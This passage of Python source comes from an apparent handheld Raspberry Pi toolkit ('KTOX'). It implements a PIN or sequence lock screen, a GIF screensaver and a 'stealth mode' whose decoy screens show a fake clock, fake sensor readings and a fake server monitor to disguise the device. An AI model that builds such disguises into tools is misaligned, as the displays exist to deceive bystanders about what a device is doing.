    deadline = time.monotonic() + max(0.0, timeout)
    while time.monotonic() < deadline:
        try:
            if all(GPIO.input(p) != 0 for p in PINS.values()):
                return
        except Exception:
            return
        time.sleep(0.01)

def _get_lock_button():
    """Non-blocking: return pressed button name or None."""
    if HAS_INPUT:
        try:
            v = rj_input.get_virtual_button()
            if v: _mark_user_activity(); return v
        except Exception:
            pass
    if HAS_HW:
        try:
            for name, pin in PINS.items():
                if GPIO.input(pin) == 0:
                    _mark_user_activity(); return name
        except Exception:
            pass
    return None

def _get_sequence_button(held: set):
    """Non-blocking sequence input: returns (button, new_held_set)."""
    if HAS_INPUT:
        try:
            v = rj_input.get_virtual_button()
            if v: _mark_user_activity(); return v, held
        except Exception:
            pass
    cur = set()
    try:
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0: cur.add(name)
    except Exception:
        return None, held
    for btn in ("KEY_PRESS_PIN", "KEY3_PIN", *LOCK_SEQUENCE_ALLOWED):
        if btn in cur and btn not in held:
            _mark_user_activity(); return btn, cur
    return None, cur

# ── GIF screensaver ───────────────────────────────────────────────────────────

def _load_ss_frames():
    from PIL import ImageSequence as _IS
    path = str(default.screensaver_gif or "").strip()
    if not path or not os.path.isfile(path): return [], []
    try: mtime = os.path.getmtime(path)
    except OSError: return [], []
    c = _lock_ss_cache
    if c["path"] == path and c["mtime"] == mtime and c["frames"]:
        return c["frames"], c["durations"]
    frames, durs = [], []
    try:
        with Image.open(path) as gif:
            for f in _IS.Iterator(gif):
                frame = f.convert("RGB").resize((128, 128)).copy()
                # Pre-bake lock icon so _draw_ss_frame needs zero PIL work
                try:
                    _tmp_draw = ImageDraw.Draw(frame)
                    _tmp_draw.text((118, 2), "\uf023",
                                   fill=color.selected_text, font=icon_font)
                except Exception:
                    pass
                frames.append(frame)
                ms = f.info.get("duration") or gif.info.get("duration") or 100
                durs.append(max(0.05, ms / 1000.0))
    except Exception:
        frames, durs = [], []
    c.update({"path": path, "mtime": mtime if frames else None,
               "frames": frames, "durations": durs})
    return frames, durs

def _draw_ss_frame(frame):
    """Write pre-composited frame directly to LCD — no PIL overhead."""
    try:
        if HAS_HW and LCD: LCD.LCD_ShowImage(frame, 0, 0)
    except Exception: pass

def _apply_random_screensaver():
    if not _random_screensaver: return
    sdir = os.path.join(default.install_path, "img", "screensaver")
    try:
        gifs = [f for f in os.listdir(sdir) if f.lower().endswith(".gif")]
        if gifs:
            import random as _r
            default.screensaver_gif = os.path.join(sdir, _r.choice(gifs))
    except Exception: pass

def _show_lock_wake(reason="Locked"):
    try:
        with draw_lock:
            draw.rectangle([0,0,128,128], fill=color.background)
            draw.line([(0,12),(128,12)], fill=color.border, width=5)
            draw.text((64, 35), "\uf023", font=icon_font, fill=color.selected_text, anchor="mm")
            draw.text((64, 55), reason,   font=text_font,  fill=color.selected_text, anchor="mm")
            draw.text((64, 75), "Press a key", font=text_font, fill=color.text, anchor="mm")
            if HAS_HW and LCD: LCD.LCD_ShowImage(image, 0, 0)
    except Exception: pass

def _play_ss_until_input(reason="Locked", skip_static=False) -> str:
    """Show static wake screen (optional), then GIF loop. Returns first button pressed."""
    if not skip_static:
        _show_lock_wake(reason)
        deadline = time.monotonic() + LOCK_SCREEN_STATIC_SECS
        while time.monotonic() < deadline:
            b = _get_lock_button()
            if b: return b
            time.sleep(0.01)

    frames, durs = _load_ss_frames()
    if not frames:
        # No GIF available — fall back to static wake screen and wait
        if skip_static:
            _show_lock_wake(reason)
        while True:
            b = _get_lock_button()
            if b: return b
            time.sleep(0.01)

    lock_runtime["showing_screensaver"] = True
    try:
        idx = 0
        while True:
            _draw_ss_frame(frames[idx])
            t0 = time.monotonic()
            while time.monotonic() - t0 < durs[idx]:
                b = _get_lock_button()
                if b: return b
                time.sleep(0.008)
            idx = (idx + 1) % len(frames)
    finally:
        lock_runtime["showing_screensaver"] = False

# ── PIN keypad UI ─────────────────────────────────────────────────────────────

_KEYPAD = (("1","2","3"),("4","5","6"),("7","8","9"),("C","0","OK"))

def _draw_pin_screen(title, prompt, entered, row, col):
    try:
        with draw_lock:
            draw.rectangle([0,0,128,128], fill=color.background)
            draw.line([(0,12),(128,12)], fill=color.border, width=5)
            draw.text((4, 1),  title,  font=text_font, fill=color.selected_text)
            draw.text((4, 14), prompt, font=text_font, fill=color.text)
            for i in range(4):
                x0 = 6 + i * 28; y0 = 28; x1 = x0+22; y1 = y0+14
                filled = i < len(entered)
                draw.rectangle([x0,y0,x1,y1],
                               fill=(color.select if filled else "#07140b"),
                               outline=(color.selected_text if filled else color.border))
                draw.text(((x0+x1)//2, (y0+y1)//2),
                          "*" if filled else "•",
                          font=text_font, fill=color.selected_text, anchor="mm")
            for r, row_keys in enumerate(_KEYPAD):
                for c2, key in enumerate(row_keys):
                    kx = 6  + c2 * 38; ky = 48 + r * 18
                    kx1 = kx+32; ky1 = ky+14
                    sel = (r == row and c2 == col)
                    draw.rectangle([kx,ky,kx1,ky1],
                                   fill=(color.select if sel else "#07140b"),
                                   outline=(color.selected_text if sel else color.border))
                    draw.text(((kx+kx1)//2, (ky+ky1)//2),
                              key, font=text_font,
                              fill=(color.selected_text if sel else color.text),
                              anchor="mm")
            if HAS_HW and LCD: LCD.LCD_ShowImage(image, 0, 0)
    except Exception: pass

_LOCK_INPUT_IDLE_SECS = 30   # return to screensaver after this many idle seconds

def _enter_pin(title, prompt, allow_cancel=True) -> "str | None":
    """Returns PIN string, None (cancel), or '__TIMEOUT__' (idle timeout)."""
    entered = []; row = 0; col = 0; hint = prompt
    prev_susp = lock_runtime["suspend_auto_lock"]
    lock_runtime["suspend_auto_lock"] = True
    try:
        while True:
            _draw_pin_screen(title, hint, entered, row, col)
            btn = getButton(timeout=_LOCK_INPUT_IDLE_SECS)
            if btn is None:
                return "__TIMEOUT__"
            if btn == "KEY_UP_PIN":    row = (row-1) % 4
            elif btn == "KEY_DOWN_PIN": row = (row+1) % 4
            elif btn == "KEY_LEFT_PIN": col = (col-1) % 3
            elif btn == "KEY_RIGHT_PIN": col = (col+1) % 3
            elif btn == "KEY1_PIN":
                if entered: entered.pop()
                hint = prompt
            elif btn == "KEY3_PIN":
                if allow_cancel: return None
            elif btn in ("KEY2_PIN", "KEY_PRESS_PIN"):
                key = _KEYPAD[row][col]
                if key == "C":
                    if entered: entered.pop()
                    hint = prompt
                elif key == "OK":
                    if len(entered) == 4: return "".join(entered)
                    hint = "Need 4 digits"
                elif len(entered) < 4:
                    entered.append(key)
                    if len(entered) == 4: return "".join(entered)
    finally:
        lock_runtime["suspend_auto_lock"] = prev_susp

# ── Sequence UI ───────────────────────────────────────────────────────────────

def _draw_seq_screen(title, prompt, entered, mask=False):
    try:
        with draw_lock:
            draw.rectangle([0,0,128,128], fill=color.background)
            draw.line([(0,12),(128,12)], fill=color.border, width=5)
            draw.text((4, 1),  title,  font=text_font, fill=color.selected_text)
            draw.text((4, 14), prompt, font=text_font, fill=color.text)
            progress = f"{len(entered)}/{LOCK_SEQUENCE_LENGTH}"
            draw.text((124, 1), progress, font=text_font, fill="#7fdc9c", anchor="ra")
            for i in range(LOCK_SEQUENCE_LENGTH):
                x0 = 4 + i*20; y0 = 32; x1 = x0+16; y1 = y0+16
                filled = i < len(entered)
                tok = ("*" if mask else LOCK_SEQUENCE_TOKENS.get(entered[i],"?")) if filled else "•"
                draw.rectangle([x0,y0,x1,y1],
                               fill=(color.select if filled else "#07140b"),
                               outline=(color.selected_text if filled else color.border))
                draw.text(((x0+x1)//2,(y0+y1)//2), tok, font=text_font,
                          fill=color.selected_text, anchor="mm")
            if entered and not mask:
                lbl = LOCK_SEQUENCE_LABELS.get(entered[-1], "")
                draw.text((4, 54), f"Last: {lbl}", font=text_font, fill="#88f0aa")
            draw.text((4, 118), "OK=back  K3=exit", font=text_font, fill="#6ea680")
            if HAS_HW and LCD: LCD.LCD_ShowImage(image, 0, 0)
    except Exception: pass

def _enter_sequence(title, prompt, allow_cancel=True, mask=False) -> "list | None":
    """Returns sequence list, None (cancel), or '__TIMEOUT__' (idle timeout)."""
    entered = []; hint = prompt; held = set()
    prev_susp = lock_runtime["suspend_auto_lock"]
    lock_runtime["suspend_auto_lock"] = True
    _wait_button_release(0.35)
    _last_seq_input = time.monotonic()
    try:
        while True:
            _draw_seq_screen(title, hint, entered, mask)
            btn, held = _get_sequence_button(held)
            if not btn:
                if time.monotonic() - _last_seq_input >= _LOCK_INPUT_IDLE_SECS:
                    return "__TIMEOUT__"
                time.sleep(0.005)
                continue
            _last_seq_input = time.monotonic()
            if btn == "KEY3_PIN":
                if allow_cancel: return None
                continue
            if btn == "KEY_PRESS_PIN":
                if entered: entered.pop()
                hint = prompt; continue
            if btn not in LOCK_SEQUENCE_ALLOWED: continue
            entered.append(btn)
            hint = prompt
            if len(entered) >= LOCK_SEQUENCE_LENGTH:
                return entered.copy()
    finally:
        lock_runtime["suspend_auto_lock"] = prev_susp

# ── Public lock API ───────────────────────────────────────────────────────────

def lock_device(reason="Locked") -> bool:
    """Show GIF screensaver then PIN/sequence challenge. Returns True on unlock."""
    _apply_random_screensaver()
    if not _lock_has_secret(): return False
    if lock_runtime["locked"]: return True

    lock_runtime["locked"] = True
    prev_susp = lock_runtime["suspend_auto_lock"]
    lock_runtime["in_lock_flow"] = True
    lock_runtime["suspend_auto_lock"] = True
    screen_lock.set()   # own the SPI bus for the entire lock session
    # skip_static=True for manual lock so the screensaver starts immediately
    skip_static = (reason == "Manual lock")
    show_kp = False
    _wait_button_release()
    try:
        while True:
            if not show_kp:
                _play_ss_until_input(reason, skip_static=skip_static)
                skip_static = False   # only skip on first show
                _wait_button_release(); show_kp = True; continue

            if _lock_mode() == LOCK_MODE_SEQUENCE:
                entered = _enter_sequence("Unlock", "Enter 6-step seq",
                                          allow_cancel=False, mask=True)
                stored  = str(lock_config.get("sequence_hash") or "")
                if entered == "__TIMEOUT__":
                    show_kp = False; continue   # idle → back to screensaver
                if entered and _verify_sequence(entered, stored):
                    lock_runtime["locked"] = False; _mark_user_activity()
                    m.render_current(); return True
                Dialog_info("Wrong sequence", wait=False, timeout=1.0)
                show_kp = False   # wrong guess → back to screensaver
            else:
                entered = _enter_pin("Unlock", "Enter 4-digit PIN",
                                     allow_cancel=False)
                stored  = str(lock_config.get("pin_hash") or "")
                if entered == "__TIMEOUT__":
                    show_kp = False; continue   # idle → back to screensaver
                if entered and _verify_pin(entered, stored):
                    lock_runtime["locked"] = False; _mark_user_activity()
                    m.render_current(); return True
                Dialog_info("Wrong PIN", wait=False, timeout=1.0)
                show_kp = False   # wrong guess → back to screensaver
    finally:
        screen_lock.clear()
        lock_runtime["showing_screensaver"] = False
        lock_runtime["in_lock_flow"] = False
        lock_runtime["suspend_auto_lock"] = prev_susp

# ── Lock settings ─────────────────────────────────────────────────────────────

def _set_pin_flow(require_current=False) -> bool:
    if require_current:
        cur = _enter_pin("Change PIN", "Current PIN")
        if not cur or not _verify_pin(cur, str(lock_config.get("pin_hash") or "")):
            Dialog_info("Wrong PIN", wait=False, timeout=1.2); return False
    while True:
        first = _enter_pin("Set PIN", "New 4-digit PIN")
        if first is None: return False
        conf  = _enter_pin("Confirm PIN", "Re-enter PIN")
        if conf is None: return False
        if first != conf:
            Dialog_info("PIN mismatch", wait=False, timeout=1.2); continue
        lock_config["pin_hash"] = _hash_pin(first)
        _lock_save_config()
        Dialog_info("PIN saved", wait=False, timeout=1.0); return True

def _set_sequence_flow(require_current=False) -> bool:
    if require_current:
        cur = _enter_sequence("Change Seq", "Current 6-step")
        if not cur or not _verify_sequence(cur, str(lock_config.get("sequence_hash") or "")):
            Dialog_info("Wrong sequence", wait=False, timeout=1.2); return False
    while True:
        first = _enter_sequence("Set Sequence", "Enter new 6-step")
        if first is None: return False
        conf  = _enter_sequence("Confirm Seq", "Repeat 6-step", mask=True)
        if conf is None: return False
        if first != conf:
            Dialog_info("Seq mismatch", wait=False, timeout=1.2); continue
        lock_config["sequence_hash"] = _hash_sequence(first)
        _lock_save_config()
        Dialog_info("Sequence saved", wait=False, timeout=1.0); return True

def _set_active_secret(require_current=False) -> bool:
    if _lock_mode() == LOCK_MODE_SEQUENCE: return _set_sequence_flow(require_current)
    return _set_pin_flow(require_current)

def _verify_current_secret() -> bool:
    if not _lock_has_secret(): return True
    if _lock_mode() == LOCK_MODE_SEQUENCE:
        cur = _enter_sequence("Verify Seq", "Current 6-step", mask=True)
        return bool(cur and _verify_sequence(cur, str(lock_config.get("sequence_hash") or "")))
    cur = _enter_pin("Verify PIN", "Current PIN")
    return bool(cur and _verify_pin(cur, str(lock_config.get("pin_hash") or "")))

def _select_ss_gif() -> None:
    """Browse GIF files in img/screensaver/ and set as screensaver."""
    from PIL import ImageSequence as _IS
    sdir = os.path.join(default.install_path, "img", "screensaver")
    os.makedirs(sdir, exist_ok=True)
    try:
        gifs = sorted(f for f in os.listdir(sdir) if f.lower().endswith(".gif"))
    except Exception:
        gifs = []
    if not gifs:
        Dialog_info("No GIFs found\nin img/screensaver/", wait=False, timeout=1.5)
        return
    idx = 0
    frames, durs = [], []
    need_load = True
    while True:
        if need_load:
            gpath = os.path.join(sdir, gifs[idx])
            Dialog_info(f"Loading...\n{gifs[idx][:16]}", wait=False)
            frames, durs = [], []
            try:
                with Image.open(gpath) as g:
                    for f in _IS.Iterator(g):
                        frames.append(f.convert("RGB").resize((128, 128)).copy())
                        durs.append(max(0.08, (f.info.get("duration") or 100) / 1000.0))
            except Exception:
                Dialog_info("Cannot load GIF", wait=False, timeout=1.0); return
            fidx = 0; need_load = False
        try:
            with draw_lock:
                image.paste(frames[fidx])
                draw.rectangle([0,114,128,128], fill="#000000")
                draw.text((2,115), gifs[idx][:20], font=text_font, fill="#888888")
            if HAS_HW and LCD: LCD.LCD_ShowImage(image, 0, 0)
        except Exception: pass
        time.sleep(durs[fidx]); fidx = (fidx+1) % len(frames)
        btn = _get_lock_button()
        if btn in ("KEY1_PIN","KEY3_PIN"): break
        elif btn == "KEY_PRESS_PIN":
            default.screensaver_gif = os.path.join(sdir, gifs[idx])
            _lock_ss_cache["path"] = None
            _lock_save_config()
            Dialog_info(f"Screensaver set\n{gifs[idx][:16]}", wait=False, timeout=1.2)
            break
        elif btn in ("KEY_LEFT_PIN","KEY_UP_PIN"):
            idx = (idx-1) % len(gifs); need_load = True; time.sleep(0.2)
        elif btn in ("KEY_RIGHT_PIN","KEY_DOWN_PIN"):
            idx = (idx+1) % len(gifs); need_load = True; time.sleep(0.2)

def OpenLockMenu() -> None:
    """Lock settings menu — accessible from System menu."""
    global _random_screensaver
    while True:
        rand_lbl = "ON" if _random_screensaver else "OFF"
        opts = [
            " Lock now",
            f" {'Deactivate' if lock_config.get('enabled') else 'Activate'} lock",
            f" Lock type: {_lock_mode_label()}",
            f" Change {_lock_mode_label()}",
            f" Auto-lock: {_lock_timeout_label()}",
            " Screensaver GIF",
            f" Random screensaver: {rand_lbl}",
        ]
        sel = GetMenuString(opts)
        if not sel: return
        s = sel.strip()
        if s == "Lock now":
            if not _lock_has_secret() and not _set_active_secret(): continue
            lock_device("Locked")
        elif s.startswith("Activate") or s.startswith("Deactivate"):
            if not _lock_has_secret():
                if not _set_active_secret(): continue
            lock_config["enabled"] = not bool(lock_config.get("enabled"))
            _lock_save_config()
            Dialog_info("Lock enabled" if lock_config["enabled"] else "Lock disabled",
                        wait=False, timeout=1.0)
        elif s.startswith("Lock type"):
            prev = _lock_mode()
            labels = [" PIN", " Sequence"]
            choice = GetMenuString(labels)
            if not choice: continue
            new_mode = LOCK_MODE_SEQUENCE if "Sequence" in choice else LOCK_MODE_PIN
            if new_mode == prev: continue
            if _lock_has_secret() and not _verify_current_secret(): continue
            lock_config["mode"] = new_mode
            if not _lock_has_secret(new_mode):
                if not _set_active_secret(): lock_config["mode"] = prev; continue
            _lock_save_config()
            Dialog_info(f"Lock type\n{_lock_mode_label(new_mode)}", wait=False, timeout=1.0)
        elif s.startswith("Change"):
            _set_active_secret(require_current=_lock_has_secret())
        elif s.startswith("Auto-lock"):
            labels = [f" {lbl}" for _, lbl in LOCK_TIMEOUT_OPTIONS]
            choice = GetMenuString(labels)
            if not choice: continue
            for v, lbl in LOCK_TIMEOUT_OPTIONS:
                if lbl in choice:
                    lock_config["auto_lock_seconds"] = v
                    _lock_save_config()
                    Dialog_info(f"Auto-lock\n{_lock_timeout_label(v)}", wait=False, timeout=1.0)
                    break
        elif s == "Screensaver GIF":
            _select_ss_gif()
        elif s.startswith("Random screensaver"):
            _random_screensaver = not _random_screensaver
            Dialog_info(f"Random screensaver\n{'ON' if _random_screensaver else 'OFF'}",
                        wait=False, timeout=1.2)

# ═══════════════════════════════════════════════════════════════════════════════
# ── Stealth mode ───────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

# ── Stealth clock: cached fonts (loaded once) ─────────────────────────────────
_STEALTH_FONTS = {}

def _stealth_fonts():
    global _STEALTH_FONTS
    if _STEALTH_FONTS:
        return _STEALTH_FONTS
    candidates = [
        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf",
        "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
        "/usr/share/fonts/truetype/liberation/LiberationSans-Bold.ttf",
        "/usr/share/fonts/truetype/liberation/LiberationSans-Regular.ttf",
    ]
    def _load(size, bold=False):
        for p in candidates:
            if bold and "Bold" not in p:
                continue
            if os.path.exists(p):
                try:
                    return ImageFont.truetype(p, size)
                except Exception:
                    pass
        return ImageFont.load_default()

    _STEALTH_FONTS = {
        "big":  _load(34, bold=True),
        "sec":  _load(20, bold=True),
        "med":  _load(13),
        "sml":  _load(10),
    }
    return _STEALTH_FONTS


def _stealth_clock_fallback(ts):
    """
    Animated decoy lock-screen clock drawn into the GLOBAL image/draw objects.
    Uses large TrueType fonts from _stealth_fonts() with sine-wave glow,
    blinking colon, smooth progress bar — all into global image/draw so
    LCD_ShowImage(image, 0, 0) is guaranteed to work.
    Must be called while holding draw_lock.
    """
    now  = datetime.fromtimestamp(ts)
    frac = ts - int(ts)
    sf   = _stealth_fonts()   # {"big":34px, "sec":20px, "med":13px, "sml":10px}

    # ── Pulsing glow: 0.0‥1.0, period ~3 s ───────────────────────────────────
    pulse = 0.5 + 0.5 * math.sin(ts * (2 * math.pi / 3.0))  # 0..1 smooth
    # Blinking colon: on for even seconds
    colon = ":" if (int(ts) % 2 == 0) else " "

    # ── Background gradient emulation (two-rect approach) ─────────────────────
    draw.rectangle([0,  0, 127, 63],  fill=(5,  7, 22))   # top half
    draw.rectangle([0, 64, 127, 127], fill=(8, 11, 30))   # bottom half

    # ── STATUS BAR (row 0–12) ─────────────────────────────────────────────────
    # Network label left
    try:
        draw.text((3, 2), "KTOX", font=sf["sml"], fill=(60, 80, 140))
    except Exception:
        pass
    # WiFi bars (3 bars, top-right area, x=88..105)
    bar_x = 88
    for i, h in enumerate((3, 5, 7)):
        bx = bar_x + i * 6
        by = 10 - h
        draw.rectangle([bx, by, bx + 3, 10], fill=(50, 120, 220))
    # Battery outline (x=108..122, y=3..9)
    draw.rectangle([108, 3, 120, 9], outline=(80, 100, 160), fill=(0, 0, 0))
    draw.rectangle([121, 5, 122, 7], fill=(80, 100, 160))   # nub
    draw.rectangle([109, 4, 117, 8], fill=(60, 190, 80))    # 75% fill
    # Status separator
    draw.line([(0, 13), (128, 13)], fill=(22, 32, 80), width=1)

    # ── TIME  HH:MM  (rows 18–54, centered, large font) ──────────────────────
    t_str = now.strftime("%H") + colon + now.strftime("%M")
    # Glow colour: blue-white pulsing
    r = int(140 + 90 * pulse)
    g = int(175 + 55 * pulse)
    b = 255
    glow_col = (r, g, b)
    # Shadow pass (offset 1px, darker) for depth
    shadow = (max(0, r - 80), max(0, g - 80), 80)
    try:
        bbox = draw.textbbox((0, 0), t_str, font=sf["big"])
        tw = bbox[2] - bbox[0]
        tx = (128 - tw) // 2
        draw.text((tx + 1, 19), t_str, font=sf["big"], fill=shadow)
        draw.text((tx,     18), t_str, font=sf["big"], fill=glow_col)
    except Exception:
        # Fallback: use menu font at known position
        draw.text((8, 18), t_str, font=small_font, fill=glow_col)

    # ── SECONDS  SS  (rows 56–76, centred, medium font) ──────────────────────
    sec_str = now.strftime("%S")
    sec_col = (int(60 + 60 * pulse), int(110 + 60 * pulse), 210)
    try:
        bbox2 = draw.textbbox((0, 0), sec_str, font=sf["sec"])
        sw = bbox2[2] - bbox2[0]
        sx = (128 - sw) // 2
        draw.text((sx, 56), sec_str, font=sf["sec"], fill=sec_col)
    except Exception:
        draw.text((56, 56), sec_str, font=small_font, fill=sec_col)

    # ── SECONDS PROGRESS BAR (row 80–83) ─────────────────────────────────────
    BAR_X, BAR_Y, BAR_W, BAR_H = 6, 80, 116, 4
    elapsed = now.second + frac
    filled  = int(BAR_W * elapsed / 60.0)
    # Track (dark)
    draw.rectangle([BAR_X, BAR_Y, BAR_X + BAR_W, BAR_Y + BAR_H - 1],
                   fill=(18, 24, 60))
    # Filled portion
    if filled > 0:
        bar_col = (int(40 + 40 * pulse), int(100 + 60 * pulse), 220)
        draw.rectangle([BAR_X, BAR_Y, BAR_X + filled, BAR_Y + BAR_H - 1],
                       fill=bar_col)
    # Glowing tip
    if 0 < filled < BAR_W:
        tip_x = BAR_X + filled
        draw.rectangle([tip_x - 1, BAR_Y - 1, tip_x + 1, BAR_Y + BAR_H],
                       fill=(200, 230, 255))

    # ── DATE LINE (row 88–100) ────────────────────────────────────────────────
    date_str = now.strftime("%a %d %b %Y")
    date_col = (75, 100, 165)
    try:
        bbox3 = draw.textbbox((0, 0), date_str, font=sf["med"])
        dw = bbox3[2] - bbox3[0]
        dx = (128 - dw) // 2
        draw.text((dx, 88), date_str, font=sf["med"], fill=date_col)
    except Exception:
        draw.text((4, 88), date_str, font=small_font, fill=date_col)

    # ── BOTTOM DIVIDER + NOTIFICATION STUB (row 104–127) ─────────────────────
    draw.line([(0, 104), (128, 104)], fill=(22, 32, 80), width=1)
    notif_col = (55, 75, 130)
    try:
        draw.text((4, 107), "No new notifications", font=sf["sml"], fill=notif_col)
        draw.text((4, 118), now.strftime("Updated %H:%M"), font=sf["sml"],
                  fill=(40, 55, 100))
    except Exception:
        pass

    return image   # global image — caller passes to LCD_ShowImage(image, 0, 0)


# ── Stealth theme 2: Environmental sensor hub ─────────────────────────────────
def _stealth_sensor(ts):
    """
    Fake smart-home environmental sensor dashboard.
    All values drift slowly via sine waves — looks like real sensor data.
    Draws into global image/draw. Must be called while holding draw_lock.
    """
    now = datetime.fromtimestamp(ts)
    sf  = _stealth_fonts()

    # Slowly drifting "sensor" values — long-period sine waves
    temp_c   = round(21.3 + 0.4 * math.sin(ts / 97.0),  1)
    humidity = round(47.0 + 2.1 * math.sin(ts / 131.0), 1)
    co2      = int(  412  + 18  * math.sin(ts / 73.0))
    pressure = round(1013.2 + 0.6 * math.sin(ts / 211.0), 1)
    lux      = int(  238  + 14  * math.sin(ts / 53.0))
    # AQI stays Good (lower is better) with tiny drift
    aqi      = int(22 + 3 * abs(math.sin(ts / 180.0)))
    aqi_label = "GOOD" if aqi < 50 else "MODERATE"
    aqi_col   = (50, 200, 80) if aqi < 50 else (240, 180, 20)

    def _bar(y, pct, col):
        """Draw a small progress bar at row y."""
        W = 60
        draw.rectangle([44, y, 44 + W, y + 5], fill=(18, 24, 60))
        filled = max(1, int(W * pct / 100))
        draw.rectangle([44, y, 44 + filled, y + 5], fill=col)

    # Background
    draw.rectangle([0, 0, 127, 127], fill=(4, 8, 18))

    # Header bar
    draw.rectangle([0, 0, 127, 13], fill=(10, 40, 80))
    try:
        draw.text((3, 2),  "SENSOR HUB", font=sf["sml"], fill=(100, 160, 220))
        draw.text((80, 2), now.strftime("%H:%M"), font=sf["sml"], fill=(160, 200, 255))
    except Exception:
        pass
    draw.line([(0, 14), (128, 14)], fill=(20, 50, 100), width=1)

    # Row layout — each row: label | bar | value
    rows = [
        # (label, bar_pct, bar_colour, value_str, value_colour)
        ("TEMP",  min(100, int((temp_c / 40) * 100)),
         (255, 120, 40),   f"{temp_c}\xb0C",   (255, 180, 100)),
        ("HUMID", int(humidity),
         (50, 160, 230),   f"{humidity}%",     (120, 200, 255)),
        ("CO2",   min(100, int((co2 / 1000) * 100)),
         (100, 200, 80),   f"{co2}ppm",        (140, 220, 120)),
        ("PRESS", 55,
         (180, 80, 220),   f"{pressure}hPa",   (200, 150, 255)),
        ("LUX",   min(100, int(lux / 500 * 100)),
         (220, 200, 50),   f"{lux}lx",         (240, 220, 120)),
    ]

    y = 18
    for label, pct, bar_col, val_str, val_col in rows:
        try:
            draw.text((2, y),  label[:5], font=sf["sml"], fill=(80, 110, 160))
            _bar(y + 1, pct, bar_col)
            draw.text((107, y), val_str[:8], font=sf["sml"], fill=val_col)
        except Exception:
            pass
        y += 14

    # Divider + AQI row
    draw.line([(0, y + 2), (128, y + 2)], fill=(20, 40, 80), width=1)
    try:
        draw.text((2, y + 5),  "AIR:",      font=sf["sml"], fill=(70, 90, 140))
        draw.text((30, y + 5), aqi_label,   font=sf["sml"], fill=aqi_col)
        draw.text((2, y + 16), f"AQI {aqi} · {lux}lx",
                  font=sf["sml"], fill=(60, 80, 130))
    except Exception:
        pass

    return image


# ── Stealth theme 3: System / server monitor ──────────────────────────────────
def _stealth_sysmon(ts, _start=[None]):
    """
    Fake system resource monitor — looks like a headless server dashboard.
    CPU/RAM/net values drift via sine waves. Uptime counts from first call.
    Draws into global image/draw. Must be called while holding draw_lock.
    """
    if _start[0] is None:
        _start[0] = ts
    uptime_s = int(ts - _start[0]) + 172800 + 50400  # fake: 2d 14h base

    sf = _stealth_fonts()

    # Fake metrics
    cpu   = round(18.0 + 22.0 * abs(math.sin(ts / 11.0))
                       + 8.0  * abs(math.sin(ts / 4.7)),  1)
    ram_u = round(1.72 + 0.18 * math.sin(ts / 47.0), 2)
    ram_t = 3.87
    ram_p = int(ram_u / ram_t * 100)
    disk_u = 12.4
    disk_t = 31.9
    disk_p = int(disk_u / disk_t * 100)
    cpu_t = round(41.0 + 3.0 * math.sin(ts / 23.0), 1)
    net_rx = round(abs(8.4  + 5.1 * math.sin(ts / 7.3)),  1)
    net_tx = round(abs(1.2  + 0.9 * math.sin(ts / 9.1)),  1)
    load1  = round(abs(0.44 + 0.18 * math.sin(ts / 31.0)), 2)
    load5  = round(abs(0.38 + 0.10 * math.sin(ts / 61.0)), 2)

    # Uptime string
    d = uptime_s // 86400
    h = (uptime_s % 86400) // 3600
    m = (uptime_s % 3600)  // 60
    up_str = f"{d}d {h:02d}h {m:02d}m"

    def _bar(y, pct, col, warn_col=(220, 80, 40), warn=80):
        W = 50
        c = warn_col if pct >= warn else col
        draw.rectangle([44, y, 44 + W, y + 4], fill=(18, 24, 60))
        filled = max(1, int(W * pct / 100))
        draw.rectangle([44, y, 44 + filled, y + 4], fill=c)

    # Background
    draw.rectangle([0, 0, 127, 127], fill=(4, 8, 18))

    # Header
    draw.rectangle([0, 0, 127, 13], fill=(20, 10, 50))
    try:
        draw.text((3, 2), "SYS MONITOR", font=sf["sml"], fill=(160, 100, 255))
        draw.text((88, 2), datetime.fromtimestamp(ts).strftime("%H:%M"),
                  font=sf["sml"], fill=(200, 160, 255))
    except Exception:
        pass
    draw.line([(0, 14), (128, 14)], fill=(40, 20, 80), width=1)

    y = 18
    try:
        draw.text((2, y), f"UP {up_str}", font=sf["sml"], fill=(70, 90, 150))
    except Exception:
        pass
    y += 12
    draw.line([(0, y), (128, y)], fill=(20, 15, 45), width=1)
    y += 3

    rows = [
        ("CPU",  int(cpu),  (100, 180, 255), f"{cpu:.0f}%"),
        ("RAM",  ram_p,     (180, 100, 255), f"{ram_u}/{ram_t:.0f}G"),
        ("DISK", disk_p,    (100, 220, 160), f"{disk_u}/{disk_t:.0f}G"),
        ("TEMP", int(cpu_t),(255, 140,  60), f"{cpu_t}\xb0C"),
    ]
    for label, pct, col, val in rows:
        try:
            draw.text((2, y),   label, font=sf["sml"], fill=(70, 80, 130))
            _bar(y + 1, pct, col)
            draw.text((97, y),  val,   font=sf["sml"], fill=col)
        except Exception:
            pass
        y += 13

    draw.line([(0, y + 1), (128, y + 1)], fill=(20, 15, 45), width=1)
    y += 4
    try:
        draw.text((2, y),
                  f"LD {load1} {load5}",
                  font=sf["sml"], fill=(90, 100, 160))
        draw.text((2, y + 11),
                  f"\u2191{net_tx}KB \u2193{net_rx}KB/s",
                  font=sf["sml"], fill=(80, 160, 120))
    except Exception:
        pass

    return image


# ── Theme registry ────────────────────────────────────────────────────────────
_STEALTH_THEMES = [
    _stealth_clock_fallback,   # 0 — animated lock-screen clock
    _stealth_sensor,           # 1 — environmental sensor hub
    _stealth_sysmon,           # 2 — system / server monitor
]
_stealth_theme_idx = 0


def _draw_stealth_theme(ts):
    """Call the active stealth theme renderer."""
    global _stealth_theme_idx
    fn = _STEALTH_THEMES[_stealth_theme_idx % len(_STEALTH_THEMES)]
    return fn(ts)


def enter_stealth():
    """
    Lock the LCD with a decoy clock screen.
    Exit: hold KEY1 + KEY3 for 3 s, or WebUI toggle
    (write {"stealth":false} to /dev/shm/ktox_stealth.json).
    """
    ktox_state["stealth"] = True
    screen_lock.set()   # freeze _display_loop and _stats_loop

    held_since  = None
    STEALTH_CMD  = "/dev/shm/ktox_stealth.json"
    STATE_FILE   = "/dev/shm/ktox_device_stealth.txt"
    # Signal WebUI that stealth is active
    try:
        open(STATE_FILE, "w").write("1")
    except Exception:
        pass
    # Clear any stale WebUI exit command from before stealth started
    try:
        os.remove(STEALTH_CMD)
    except Exception:
        pass

    global _stealth_theme_idx
    _stealth_theme_idx = 0          # always start on clock theme
    _sysmon_start = [None]          # reset sysmon uptime counter each entry
    key2_held_since = None          # for 5-second theme-switch hold
